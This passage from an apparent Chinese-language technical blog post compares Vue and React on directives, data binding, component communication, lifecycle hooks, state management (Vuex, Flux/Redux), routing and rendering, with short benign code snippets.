<li><p><code>Vue</code>中的指令很方便，指令 (Directives) 是带有 <code>v-</code> 前缀的特殊属性。指令属性的值预期是单个 <code>JavaScript</code> 表达式 (<code>v-for</code> 是例外情况，稍后我们再讨论)。指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 <code>DOM</code>。</p>
</li>
<li><p><code>Vue</code>中的12个指令： <code>v-bind,v-once,v-model,v-text,v-html,v-on,v-if,v-else,v-show,v-for,v-pre,v-clock</code></p>
</li>
</ul>
<h4 id="1-1-3-class与style绑定"><a href="#1-1-3-class与style绑定" class="headerlink" title="1.1.3 class与style绑定"></a>1.1.3 class与style绑定</h4><ul>
<li>数据绑定的一个常见需求是操作元素的 <code>class 列表和它的内联样式。因为它们都是属性 ，我们可以用</code>v-bind<code>处理它们：只需要计算出表达式最终的字符串。不过，字符串拼接麻烦又易错。因此，在</code>v-bind<code>用于</code>class<code>和</code>style<code>时，</code>Vue.js` 专门增强了它。表达式的结果类型除了字符串之外，还可以是对象或数组。</li>
<li>对象语法<ul>
<li>我们可以传给 <code>v-bind:class</code> 一个对象，以动态地切换 <code>class</code></li>
</ul>
</li>
<li>数组语法<ul>
<li>我们可以把一个数组传给 <code>v-bind:class</code>，以应用一个 <code>class</code> 列表：</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div v-bind:<span class="class"><span class="keyword">class</span></span>=<span class="string">"[activeClass, errorClass]"</span>&gt;&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="1-1-4-条件渲染和列表渲染"><a href="#1-1-4-条件渲染和列表渲染" class="headerlink" title="1.1.4 条件渲染和列表渲染"></a>1.1.4 条件渲染和列表渲染</h4><ul>
<li><code>v-if</code>条件渲染一组数</li>
<li>我们用 <code>v-for</code> 指令根据一组数组的选项列表进行渲染。<code>v-for</code> 指令需要使用 <code>item in items</code> 形式的特殊语法，<code>items</code> 是源数据数组并且 <code>item</code> 是数组元素迭代的别名。</li>
</ul>
<h4 id="1-1-5-事件处理器"><a href="#1-1-5-事件处理器" class="headerlink" title="1.1.5 事件处理器"></a>1.1.5 事件处理器</h4><ul>
<li>通过<code>v-on</code>给元素注册事件</li>
<li>使用 <code>v-on</code> 有几个好处：<ul>
<li>扫一眼 <code>HTML</code> 模板便能轻松定位在 <code>JavaScript</code> 代码里对应的方法。</li>
<li>因为你无须在 <code>JavaScript</code> 里手动绑定事件，你的 <code>ViewModel</code> 代码可以是非常纯粹的逻辑，和 <code>DOM</code> 完全解耦，更易于测试。</li>
<li>当一个 <code>ViewModel</code> 被销毁时，所有的事件处理器都会自动被删除。你无须担心如何自己清理它们。</li>
</ul>
</li>
</ul>
<h4 id="1-1-6-表单控件"><a href="#1-1-6-表单控件" class="headerlink" title="1.1.6 表单控件"></a>1.1.6 表单控件</h4><ul>
<li><code>v-model</code>在表单控件元素上创建双向数据绑定</li>
<li>它会根据控件类型自动选取正确的方法来更新元素。</li>
</ul>
<h4 id="1-1-7-计算属性"><a href="#1-1-7-计算属性" class="headerlink" title="1.1.7 计算属性"></a>1.1.7 计算属性</h4><ul>
<li>在<code>Vue</code>中引入了计算属性来处理模板中放入太多的逻辑会让模板过重且难以维护的问题，这样不但解决了上面的问题，而且也同时让模板和业务逻辑更好的分离。</li>
<li>简单来说，假如<code>data</code>里面有属性<code>a=1</code>，然后你需要一个变量跟着<code>a</code>变化，例如<code>b=a+1</code>，那么就需要用到计算属性，<code>Vue</code>实例的<code>computed</code>属性中，设置<code>b</code>为其属性，其表现为一个函数，返回值是<code>b</code>的值。</li>
</ul>
<h4 id="1-1-8-ajax数据请求"><a href="#1-1-8-ajax数据请求" class="headerlink" title="1.1.8 ajax数据请求"></a>1.1.8 ajax数据请求</h4><ul>
<li><code>vue2.0</code>中数据请求推荐使用<code>axios</code></li>
</ul>
<p>注： <code>关于vue的数据双向绑定和单向数据流</code></p>
<ul>
<li><p><code>Vue</code> 的依赖追踪是【原理上不支持双向绑定，<code>v-model</code> 只是通过监听 <code>DOM</code> 事件实现的语法糖】</p>
</li>
<li><p><code>Vue</code>的依赖追踪是通过 <code>Object.defineProperty</code> 把<code>data</code>对象的属性全部转为 <code>getter/setter</code>来实现的；当改变数据的某个属性值时，会触发<code>set</code>函数,获取该属性值的时候会触发<code>get</code>函数，通过这个特性来实现改变数据时改变视图；也就是说只有当数据改变时才会触发视图的改变，反过来在操作视图时，只能通过DOM事件来改变数据，再由此来改变视图，以此来实现双向绑定</p>
</li>
<li><p>双向绑定是在同一个组件内，将数据和视图绑定起来，和父子组件之间的通信并无什么关联；</p>
</li>
<li>组件之间的通信采用单向数据流是为了组件间更好的解耦，在开发中可能有多个子组件依赖于父组件的某个数据，假如子组件可以修改父组件数据的话，一个子组件变化会引发所有依赖这个数据的子组件发生变化，所以<code>vue</code>不推荐子组件修改父组件的数据，直接修改<code>props</code>会抛出警告</li>
</ul>
<h3 id="1-2-react没有数据双向绑定"><a href="#1-2-react没有数据双向绑定" class="headerlink" title="1.2 react没有数据双向绑定"></a>1.2 <code>react</code>没有数据双向绑定</h3><ul>
<li><code>react</code>是单向数据流</li>
<li><code>react</code>中通过将<code>state</code>（Model层）与<code>View</code>层数据进行双向绑定达数据的实时更新变化，具体来说就是在<code>View</code>层直接写<code>JS</code>代码<code>Model</code>层中的数据拿过来渲染，一旦像表单操作、触发事件、<code>ajax</code>请求等触发数据变化，则进行双同步</li>
</ul>
<h4 id="1-2-1事件处理"><a href="#1-2-1事件处理" class="headerlink" title="1.2.1事件处理"></a>1.2.1事件处理</h4><ul>
<li><p><code>React</code> 元素的事件处理和 <code>DOM</code>元素的很相似。但是有一点语法上的不同:</p>
<ul>
<li><code>React</code>事件绑定属性的命名采用驼峰式写法，而不是小写。</li>
<li>如果采用 <code>JSX</code> 的语法你需要传入一个函数作为事件处理函数，而不是一个字符串(<code>DOM</code>元素的写法)</li>
<li>在 <code>React</code> 中另一个不同是你不能使用返回 false 的方式阻止默认行为。你必须明确的使用 preventDefault。</li>
<li><p>当你使用 ES6 class 语法来定义一个组件的时候，事件处理器会成为类的一个方法。一般需要显式的绑定<code>this</code>，例如</p>
<p><code>this.handleClick = this.handleClick.bind(this);</code></p>
</li>
<li><p>你必须谨慎对待 <code>JSX</code> 回调函数中的 <code>this</code>，类的方法默认是不会绑定 <code>this</code> 的。如果你忘记绑定 <code>this.handleClick</code> 并把它传入 <code>onClick</code>, 当你调用这个函数的时候 <code>this</code> 的值会是 <code>undefined</code>。</p>
</li>
</ul>
</li>
</ul>
<h4 id="1-2-2-条件渲染"><a href="#1-2-2-条件渲染" class="headerlink" title="1.2.2 条件渲染"></a>1.2.2 条件渲染</h4><ul>
<li><code>React</code> 中的条件渲染和 <code>JavaScript</code> 中的一致，使用 <code>JavaScript</code> 操作符 <code>if</code> 或条件运算符来创建表示当前状态的元素，然后让 <code>React</code> 根据它们来更新 UI。</li>
<li>你可以通过用花括号包裹代码在 <code>JSX</code> 中嵌入任何表达式 ，也包括 <code>JavaScript</code> 的逻辑与 &amp;&amp;，它可以方便地条件渲染一个元素。之所以能这样做，是因为在 <code>JavaScript</code> 中，<code>true &amp;&amp; expression</code> 总是返回 <code>expression</code>，而 <code>false &amp;&amp; expression</code> 总是返回 <code>false</code>。因此，如果条件是 <code>true</code>，&amp;&amp; 右侧的元素就会被渲染，如果是 <code>false</code>，<code>React</code> 会忽略并跳过它。</li>
<li>条件渲染的另一种方法是使用 <code>JavaScript</code> 的条件运算符 <code>condition ? true : false</code>。</li>
</ul>
<h4 id="1-2-3-列表渲染"><a href="#1-2-3-列表渲染" class="headerlink" title="1.2.3 列表渲染"></a>1.2.3 列表渲染</h4><ul>
<li>你可以通过使用{}在<code>JSX</code>内构建一个元素集合，使用<code>Javascript</code>中的<code>map()</code>方法循遍历数组</li>
<li>Keys可以在<code>DOM</code>中的某些元素被增加或删除的时候帮助<code>React</code>识别哪些元素发生了变化。因此你应当给数组中的每一个元素赋予一个确定的标识。一个元素的key最好是这个元素在列表中拥有的一个独一无二的字符串。通常，我们使用来自数据的id作为元素的key。</li>
</ul>
<h4 id="1-2-4-表单操作"><a href="#1-2-4-表单操作" class="headerlink" title="1.2.4 表单操作"></a>1.2.4 表单操作</h4><ul>
<li><code>HTML</code>表单元素与<code>React</code>中的其他<code>DOM</code>元素有所不同,因为表单元素生来就保留一些内部状态。</li>
<li>当用户提交表单时，<code>HTML</code>的默认行为会使这个表单会跳转到一个新页面。在<code>React</code>中亦是如此。但大多数情况下，我们都会构造一个处理提交表单并可访问用户输入表单数据的函数。实现这一点的标准方法是使用一种称为“受控组件”的技术。其值由<code>React</code>控制的输入表单元素称为“受控组件”。<code>this.setState({value: event.target.value})</code>;</li>
<li>当你有处理多个受控的input元素时，你可以通过给每个元素添加一个name属性，来让处理函数根据 <code>event.target.name</code>的值来选择做什么。</li>
</ul>
<h4 id="1-2-5-状态提升"><a href="#1-2-5-状态提升" class="headerlink" title="1.2.5 状态提升"></a>1.2.5 状态提升</h4><ul>
<li>在<code>React</code>中，状态分享是通过将<code>state</code>数据提升至离需要这些数据的组件最近的父组件来完成的。这就是所谓的状态提升。<code>this.props.xxx</code></li>
<li>在<code>React</code>应用中，对应任何可变数据理应只有一个单一“数据源”。通常，状态都是首先添加在需要渲染数据的组件中。此时，如果另一个组件也需要这些数据，你可以将数据提升至离它们最近的父组件中。你应该在应用中保持 自上而下的数据流，而不是尝试在不同组件中同步状态。</li>
</ul>
<h2 id="2-组件化以及组件数据流"><a href="#2-组件化以及组件数据流" class="headerlink" title="2.组件化以及组件数据流"></a>2.组件化以及组件数据流</h2><h3 id="2-1-React中的组件及数据流"><a href="#2-1-React中的组件及数据流" class="headerlink" title="2.1 React中的组件及数据流"></a>2.1 <code>React</code>中的组件及数据流</h3><ul>
<li><code>React</code>是单向数据流，数据主要从父节点传递到子节点（通过<code>props</code>）。如果顶层（父级）的某个<code>props</code>改变了，<code>React</code>会重渲染所有的子节点。</li>
<li><code>React</code>中实现组件有两种实现方式，一种是createClass方法，另一种是通过ES2015的思想类继承<code>React</code>.Component来实现</li>
<li>在<code>React</code>应用中，按钮、表单、对话框、整个屏幕的内容等，这些通常都被表示为组件。</li>
<li><code>React</code>推崇的是函数式编程和单向数据流：给定原始界面（或数据），施加一个变化，就能推导出另外一个状态（界面或者数据的更新）</li>
<li>组件可以将UI切分成一些的独立的、可复用的部件，这样你就只需专注于构建每一个单独的部件。组件从概念上看就像是函数，它可以接收任意的输入值（称之为“<code>props</code>”），并返回一个需要在页面上展示的<code>React</code>元素。<br><code>1. props的只读性</code></li>
<li>无论是使用函数或是类来声明一个组件，它决不能修改它自己的<code>props</code>。</li>
<li>所有的<code>React</code>组件必须像纯函数那样使用它们的<code>props</code>。</li>
</ul>
<h4 id="props与state的区别"><a href="#props与state的区别" class="headerlink" title="props与state的区别"></a><code>props</code>与<code>state</code>的区别</h4><ul>
<li><code>props</code>是property的缩写，可以理解为<code>HTML</code>标签的attribute。不可以使用<code>this.props</code>直接修改<code>props</code>，因为<code>props</code>是只读的，<code>props</code>是用于整个组件树中传递数据和配置。在当前组件访问<code>props</code>，使用<code>this.props</code>。</li>
<li><code>props</code>是一个组件的设置参数，可以在父控件中选择性设置。父组件对子控件的<code>props</code>进行赋值，并且<code>props</code>的值不可改变。一个子控件自身不能改变自己的 <code>props</code>。</li>
<li><code>state</code>:当一个组件 mounts的时候，<code>state</code>如果设置有默认值的会被使用，并且<code>state</code>可能时刻的被改变。一个子控件自身可以管理自己的<code>state</code>，但是需要注意的是，无法管理其子控件的<code>state</code>。所以可以认为，<code>state</code>是子控件自身私有的。</li>
<li>每个组件都有属于自己的<code>state</code>，<code>state</code>和<code>props</code>的区别在于前者(<code>state</code>)只存在于组件内部，只能从当前组件调用<code>this.setState</code>修改<code>state</code>值（不可以直接修改<code>this.state</code>！）。</li>
<li><code>props</code>是一个父组件传递给子组件的数据流，可以一直的被传递到子孙组件中。然而 <code>state</code>代表的是子组件自身的内部状态。从语义上讲，改变组件的状态，可能会导致<code>DOM</code>结构的改变或者重新渲染。而<code>props</code>是父组件传递的参数，所以可以被用于初始化渲染和改变组件自身的状态，虽然大多数时候组件的状态是又外部事件触发改变的。我们需要知道的是，无论是<code>state</code>改变，还是父组件传递的 <code>props</code>改变，render方法都可能会被执行。</li>
<li>一般我们更新子组件都是通过改变<code>state</code>值，更新新子组件的<code>props</code>值从而达到更新。</li>
</ul>
<h4 id="2-1-1-组件之间的通信"><a href="#2-1-1-组件之间的通信" class="headerlink" title="2.1.1 组件之间的通信"></a>2.1.1 组件之间的通信</h4><p>父子组件数通信<br>父与子之间通<code>props</code>属性进行传递<br>子与父之间，父组件定义事件，子组件触发父组件中的事件时，通过实参的形式来改变父组件中的数据来通信<br>即：</p>
<ul>
<li>父组件更新组件状态 —–<code>props</code>—–&gt;　子组件更新</li>
<li>子组件更新父组件状态 —–需要父组件传递回调函数—–&gt; 子组件调用触发</li>
</ul>
<p>非父子组件之间的通信，嵌套不深的非父子组件可以使共同父组件，触发事件函数传形参的方式来实现<br>兄弟组件：<br>（1） 按照<code>React</code>单向数据流方式，我们需要借助父组件进行传递，通过父组件回调函数改变兄弟组件的<code>props</code>。</p>
<ul>
<li>其实这种实现方式与子组件更新父组件状态的方式是大同小异的。</li>
</ul>
<p>（2） 当组件层次很深的时候，在这里，<code>React</code>官方给我们提供了一种上下文方式，可以让子组件直接访问祖先的数据或函数，无需从祖先组件一层层地传递数据到子组件中。</p>
<h4 id="2-1-2-组件的生命周期"><a href="#2-1-2-组件的生命周期" class="headerlink" title="2.1.2 组件的生命周期"></a>2.1.2 组件的生命周期</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">construtor() <span class="comment">//创建组件</span></span><br><span class="line">componentWillMount() <span class="comment">//组件挂载之前</span></span><br><span class="line">componentDidMount() <span class="comment">// 组件挂载之后</span></span><br><span class="line">componentWillReceiveProps() <span class="comment">// 父组件发生render的时候子组件调用该函数</span></span><br><span class="line">shouldComponentUpdate() <span class="comment">// 组件挂载之后每次调用setState后都会调用该函数判断是否需要重新渲染组件，默认返回true</span></span><br><span class="line">componentDidUpdate() <span class="comment">// 更新</span></span><br><span class="line">render() <span class="comment">//渲染，`React`中的核心函数</span></span><br><span class="line">componentWillUnmount() <span class="comment">//组件被卸载的时候调用，一般在componentDidMount注册的事件需要在这里删除</span></span><br></pre></td></tr></table></figure>
<p><img src="/static/img/3333422-04ea055c73c50c98.png" width="800"></p>
<h3 id="2-2-Vue中的组件和数据流"><a href="#2-2-Vue中的组件和数据流" class="headerlink" title="2.2 Vue中的组件和数据流"></a>2.2 <code>Vue</code>中的组件和数据流</h3><h4 id="2-2-1-组件化应用构建"><a href="#2-2-1-组件化应用构建" class="headerlink" title="2.2.1 组件化应用构建"></a>2.2.1 组件化应用构建</h4><ul>
<li>组件系统是 <code>Vue</code> 的另一个重要概念，因为它是一种抽象，允许我们使用小型、独立和通常可复用的组件构建大型应用。</li>
<li>在 <code>Vue</code> 里，一个组件本质上是一个拥有预定义选项的一个 <code>Vue</code> 实例</li>
<li>在一个大型应用中，有必要将整个应用程序划分为组件，以使开发可管理。</li>
<li>组件(component)是 <code>Vue</code> 最强大的功能之一。组件可以帮助你扩展基本的 <code>HTML</code> 元素，以封装可重用代码。在较高层面上，组件是 <code>Vue</code> 编译器附加行为后的自定义元素。在某些情况下，组件也可以是原生 <code>HTML</code> 元素的形式，以特定的 <code>is</code> 特性扩展。</li>
<li>组件中，data必须是一个函数</li>
<li>组件可以扩展 <code>HTML</code> 元素，封装可重用的代码。在较高层面上，组件是自定义元素，<code>Vue.js</code> 的编译器为它添加特殊功能。在有些情况下，组件也可以是原生 <code>HTML</code> 元素的形式，以 is 特性扩展。</li>
</ul>
<h4 id="2-2-2-响应式"><a href="#2-2-2-响应式" class="headerlink" title="2.2.2 响应式"></a>2.2.2 响应式</h4><ul>
<li>当一个 <code>Vue</code> 实例被创建时，它向 <code>Vue</code> 的响应式系统中加入了其 <code>data</code> 对象中能找到的所有的属性。当这些属性的值发生改变时，视图将会产生“响应”，即匹配更新为新的值。</li>
<li>当这些数据改变时，视图会进行重渲染。值得注意的是只有当实例被创建时 <code>data</code> 中存在的属性是响应式的。</li>
</ul>
<h4 id="2-2-3-组件的生命周期"><a href="#2-2-3-组件的生命周期" class="headerlink" title="2.2.3 组件的生命周期"></a>2.2.3 组件的生命周期</h4><ul>
<li>每个 <code>Vue</code> 实例在被创建之前都要经过一系列的初始化过程。例如需要设置数据监听、编译模板、挂载实例到 <code>DOM</code>、在数据变化时更新 <code>DOM</code> 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，给予用户机会在一些特定的场景下添加他们自己的代码。</li>
<li>比如 <code>created</code> 钩子可以用来在一个实例被创建之后执行代码，也有一些其它的钩子，在实例生命周期的不同场景下调用，如 <code>mounted、updated、destroyed</code>。钩子的 <code>this</code> 指向调用它的 <code>Vue</code> 实例。</li>
<li>生命周期图示：<br><img src="/static/img/lifecycle.png" width="600"></li>
</ul>
<h4 id="2-2-3-组件之间的通信"><a href="#2-2-3-组件之间的通信" class="headerlink" title="2.2.3 组件之间的通信"></a>2.2.3 组件之间的通信</h4><ul>
<li><code>Vue</code>默认的是单向数据流，这是<code>Vue</code>直接提出来说明的，父组件默认可以向子组件传递数据，但是子组件向父组件传递数据就需要额外设置了。</li>
<li><code>Vue</code> 也支持双向绑定，默认为单向绑定，数据从父组件单向传给子组件。在大型应用中使用单向绑定让数据流易于理解。</li>
<li>父子组件之间的数据通信是通过<code>Prop</code>和自定义事件实现的，而非父子组件可以使用订阅/发布模式实现（类似于Angualr中的非父子指令之间的通信），再复杂一点也是建议使用状态管理（<code>Vuex</code>）。</li>
<li>在 <code>Vue</code> 中，父子组件之间的关系可以概述为：<code>props</code> 向下，<code>events</code> 向上。父组件通过 <code>props</code> 向下传递数据给子组件，子组件通过 <code>events</code> 发送消息给父组件。</li>
</ul>
<h5 id="1-父向子"><a href="#1-父向子" class="headerlink" title="1.父向子"></a>1.父向子</h5><ul>
<li>每个组件实例都有自己的孤立隔离作用域。也就是说，不能（也不应该）直接在子组件模板中引用父组件数据。要想在子组件模板中引用父组件数据，可以使用 <code>props</code> 将数据向下传递到子组件。</li>
<li>每个 <code>prop</code> 属性,都可以控制是否从父组件的自定义属性中接收数据。子组件需要使用 <code>props</code> 选项显式声明 <code>props</code>，以便它可以从父组件接收到期望的数据。</li>
<li>动态<code>props</code>，类似于将一个普通属性绑定到一个表达式，我们还可以使用 <code>v-bind</code> 将 <code>props</code> 属性动态地绑定到父组件中的数据。无论父组件何时更新数据，都可以将数据向下流入到子组件中</li>
</ul>
<h5 id="2-子向父"><a href="#2-子向父" class="headerlink" title="2.子向父"></a>2.子向父</h5><ul>
<li>使用自定义事件</li>
<li>每个 <code>Vue</code> 实例都接入了一个事件接口<code>(events interface)</code>，也就是说，这些 <code>Vue</code> 实例可以做到：</li>
<li>使用 <code>on(eventName)</code>监听一个事件−使用<code>emit(eventName)</code> 触发一个事件</li>
</ul>
<h5 id="3-非父子组件通信"><a href="#3-非父子组件通信" class="headerlink" title="3. 非父子组件通信"></a>3. 非父子组件通信</h5><ul>
<li>可以使用一个空的 <code>Vue</code> 实例作为一个事件总线中心<code>(central event bus)</code>，用<code>emit</code>触发事件，<code>on</code>监听事件</li>
</ul>
<h4 id="2-2-4-单向数据流"><a href="#2-2-4-单向数据流" class="headerlink" title="2.2.4 单向数据流"></a>2.2.4 单向数据流</h4><p>单向数据流示意图：<br><img src="/static/img/flow.png" width="600"></p>
<h2 id="3-状态管理"><a href="#3-状态管理" class="headerlink" title="3.状态管理"></a>3.状态管理</h2><h3 id="3-1-React中的状态管理：Flux"><a href="#3-1-React中的状态管理：Flux" class="headerlink" title="3.1 React中的状态管理：Flux"></a>3.1 <code>React</code>中的状态管理：<code>Flux</code></h3><ul>
<li><p><code>Redux</code> 是 <code>React</code> 生态环境中最流行的 <code>Flux</code> 实现。<code>Redux</code> 事实上无法感知视图层，所以它能够轻松的通过一些简单绑定和 <code>Vue</code> 一起使用。</p>
<p>  1、创建<code>actions</code></p>
<pre><code>1、定义动作，事件触发需要用`dispatcher`来调用
2、行为，如增加操作、删除操作、更新操作，就是一堆函数。
</code></pre><p>  2、创建<code>store</code></p>
<pre><code>1、`store`中包含应用的状态和逻辑，用来管理应用中不同的状态和逻辑，相当于`Model`层
</code></pre><p>  3、创建<code>dispatcher</code></p>
<pre><code>1、在`dispatcher`中通过`register`来给每个`action`注对应的的`store`中的方法
</code></pre><p>  4、在<code>view</code>层调用<code>action</code>中的方法</p>
<pre><code>1、就是各类`component`
</code></pre></li>
</ul>
<p><img src="/static/img/20150625201409735.png" width="800"></p>
<h3 id="3-2-Vue中的状态管理vuex"><a href="#3-2-Vue中的状态管理vuex" class="headerlink" title="3.2 Vue中的状态管理vuex"></a>3.2 <code>Vue</code>中的状态管理<code>vuex</code></h3><ul>
<li><code>Vuex</code>借鉴了 Flux、Redux、和 The Elm Architecture。与其他模式不同的是，<code>Vuex</code> 是专门为 <code>Vue.js</code> 设计的状态管理库，以利用 <code>Vue.js</code> 的细粒度数据响应机制来进行高效的状态更新。这使得它能够更好地和 Vue 进行整合，同时提供简洁的 API 和改善过的开发体验。</li>
<li><p>组件不允许直接修改属于 <code>store</code> 实例的 <code>state</code>，而应执行 action 来分发 (dispatch) 事件通知 <code>store</code> 去改变，我们最终达成了 Flux 架构。这样约定的好处是，我们能够记录所有 <code>store</code> 中发生的 <code>state</code> 改变，同时实现能做到记录变更 (mutation)、保存状态快照、历史回滚/时光旅行的先进的调试工具。</p>
</li>
<li><p>每一个 <code>Vuex</code> 应用的核心就是 <code>store</code>（仓库）。“<code>store</code>”基本上就是一个容器，它包含着你的应用中大部分的状态</p>
</li>
<li><p><code>Vuex</code> 和单纯的全局对象有以下两点不同：</p>
<pre><code>1、`Vue`x 的状态存储是响应式的。当 `Vue` 组件从 `store` 中读取状态的时候，若 `store` 中的状态发生变化，那么相应的组件也会相应地得到高效更新。

2、你不能直接改变 `store` 中的状态。改变 `store` 中的状态的唯一途径就是显式地提交 (commit) mutation。这样使得我们可以方便地跟踪每一个状态的变化，从而让我们能够实现一些工具帮助我们更好地了解我们的应用。

3、`state`
</code></pre></li>
<li><p><code>Vuex</code> 使用单一状态树——是的，用一个对象就包含了全部的应用层级状态。至此它便作为一个“唯一数据源 (SSOT)”而存在。这也意味着，每个应用将仅仅包含一个 <code>store</code> 实例。单一状态树让我们能够直接地定位任一特定的状态片段，在调试的过程中也能轻易地取得整个当前应用状态的快照。这也意味着，每个应用将仅仅包含一个 <code>store</code> 实例。</p>
<pre><code>1、Getters
</code></pre></li>
<li><p>从<code>state</code>中获取状态值，有时候我们需要从 <code>store</code> 中的 <code>state</code> 中派生出一些状态，例如对列表进行过滤并计数。</p>
<pre><code>1、Mutation
    1、更改 `Vuex` 的 `store` 中的状态的唯一方法是提交 mutation。`Vuex` 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 `state` 作为第一个参数。
    2、你不能直接调用一个 mutation handler。这个选项更像是事件注册：“当触发一个类型为 increment 的 mutation 时，调用此函数。”要唤醒一个 mutation handler，你需要以相应的 type 调用 `store.commit` 方法

2、Action

    1、Action 类似于 mutation，不同在于：

    2、Action 提交的是 mutation，而不是直接变更状态。

    3、Action 可以包含任意异步操作。
    4、dispatch分发action

3、Module
</code></pre></li>
<li><p>由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，<code>store</code> 对象就有可能变得相当臃肿。</p>
</li>
<li><code>Vuex</code> 允许我们将 <code>store</code> 分割成模块（module）。每个模块拥有自己的 <code>state、mutation、action、getter</code>、甚至是嵌套子模块——从上至下进行同样方式的分割</li>
</ul>
<p><img src="/static/img/vuex (1).png" width="600"></p>
<h2 id="4-路由"><a href="#4-路由" class="headerlink" title="4.路由"></a>4.路由</h2><ul>
<li>两者的路由很相似，都是利用了组件化思想<h3 id="4-1-React中的路由"><a href="#4-1-React中的路由" class="headerlink" title="4.1 React中的路由"></a>4.1 <code>React</code>中的路由</h3></li>
<li>在路由库的问题上，<code>React</code> 选择把问题交给社区维护，因此创建了一个更分散的生态系统。但相对的，<code>React</code> 的生态系统相比 <code>Vue</code> 更加繁荣。</li>
<li><code>React</code>中，需要引入<code>react-router</code>库，<br>使用时，路由器Router就是<code>React</code>的一个组件。</li>
<li>Router组件本身只是一个容器，真正的路由要通过Route组件定义。</li>
<li><p>Route组件定义了URL路径与组件的对应关系。你可以同时使用多个Route组件。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;Router history=&#123;hashHistory&#125;&gt;</span><br><span class="line">  &lt;Route path=<span class="string">"/"</span> component=&#123;App&#125;/&gt;</span><br><span class="line">  &lt;Route path=<span class="string">"/repos"</span> component=&#123;Repos&#125;/&gt;</span><br><span class="line">  &lt;Route path=<span class="string">"/about"</span> component=&#123;About&#125;/&gt;</span><br><span class="line">&lt;<span class="regexp">/Router&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Link组件用于取代元素，生成一个链接，允许用户点击后跳转到另一个路由。它基本上就是元素的<code>React</code> 版本，可以接收Router的状态。</p>
</li>
</ul>
<h3 id="4-2-Vue中的路由"><a href="#4-2-Vue中的路由" class="headerlink" title="4.2 Vue中的路由"></a>4.2 <code>Vue</code>中的路由</h3><ul>
<li>Vue 的路由库和状态管理库都是由官方维护支持且与核心库同步更新的。</li>
<li>使用 <code>Vue.js</code> ，我们已经可以通过组合组件来组成应用程序，当你要把 vue-router 添加进来，我们需要做的是，将组件(components)映射到路由(routes)，然后告诉 vue-router 在哪里渲染它们。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello App!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用 router-link 组件来导航. --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 通过传入 `to` 属性指定链接. --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">"/foo"</span>&gt;</span>Go to Foo<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">"/bar"</span>&gt;</span>Go to Bar<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 路由出口 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 路由匹配到的组件将渲染在这里 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="5-渲染性能对比"><a href="#5-渲染性能对比" class="headerlink" title="5. 渲染性能对比"></a>5. 渲染性能对比</h2><ul>
<li>在操作界面时，要尽量减少对<code>DOM</code>的操作，<code>Vue</code> 和 <code>React</code> 都使用虚拟<code>DOM</code>来实现，并且两者工作一样好。</li>
<li>尽量减少除<code>DOM</code>操作以外的其他操作。（<code>Vue</code>和<code>React</code>的不同）</li>
</ul>
<h3 id="5-1-React视图渲染"><a href="#5-1-React视图渲染" class="headerlink" title="5.1 React视图渲染"></a>5.1 <code>React</code>视图渲染</h3><ul>
<li><p><code>React</code> 的渲染建立在 Virtual <code>DOM</code> 上——一种在内存中描述 <code>DOM</code> 树状态的数据结构。当状态发生变化时，<code>React</code> 重新渲染 Virtual <code>DOM</code>，比较计算之后给真实 <code>DOM</code> 打补丁。</p>
</li>
<li><p>Virtual <code>DOM</code> 提供了函数式的方法描述视图，它不使用数据观察机制，每次更新都会重新渲染整个应用，因此从定义上保证了视图与数据的同步。它也开辟了 JavaScript 同构应用的可能性。</p>
</li>
<li><p>在超大量数据的首屏渲染速度上，<code>React</code> 有一定优势，因为 <code>Vue</code> 的渲染机制启动时候要做的工作比较多，而且 <code>React</code> 支持服务端渲染。</p>
</li>
<li><p>元素是构成 <code>React</code> 应用的最小单位。元素用来描述你在屏幕上看到的内容，与浏览器的 <code>DOM</code> 元素不同，<code>React</code> 当中的元素事实上是普通的对象，<code>React</code> <code>DOM</code> 可以确保 浏览器 <code>DOM</code> 的数据内容与 <code>React</code> 元素保持一致。</p>
</li>
<li><p>我们用<code>React</code> 开发应用时一般只会定义一个根节点。但如果你是在一个已有的项目当中引入 <code>React</code> 的话，你可能会需要在不同的部分单独定义 <code>React</code> 根节点。我们将 元素传入一个名为 <code>ReactDOM.render()</code> 的方法来将其渲染到页面上，页面上就会显示该元素。</p>
</li>
</ul>
<h4 id="组件渲染"><a href="#组件渲染" class="headerlink" title="组件渲染"></a>组件渲染</h4><ul>
<li>当<code>React</code>遇到的元素是用户自定义的组件，它会将<code>JSX</code>属性作为单个对象传递给该组件,这个对象称之为“<code>props</code>”。</li>
</ul>
